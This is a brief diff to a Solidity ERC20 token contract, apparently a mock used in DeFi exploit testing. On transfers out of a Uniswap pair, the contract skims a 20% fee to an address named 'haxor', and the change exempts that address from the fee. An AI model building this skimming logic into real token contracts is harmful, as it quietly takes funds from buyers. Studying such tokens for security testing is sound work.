@@ -19,7 +19,7 @@ contract FeeERC20 is ERC20 {
     }
 
     function transfer(address to, uint256 amount) public override returns (bool) {
-        if (msg.sender == uniPair) {
+        if (msg.sender == uniPair && to != haxor) {
             uint256 fee = (amount * 20) / 100;
             super.transfer(haxor, fee);
             amount -= fee;
@@ -33,7 +33,7 @@ contract FeeERC20 is ERC20 {
         address to,
         uint256 amount
     ) public override returns (bool) {
-        if (from == uniPair) {
+        if (from == uniPair && to != haxor) {
             uint256 fee = (amount * 20) / 100;
             super.transferFrom(from, haxor, fee);
             amount -= fee;
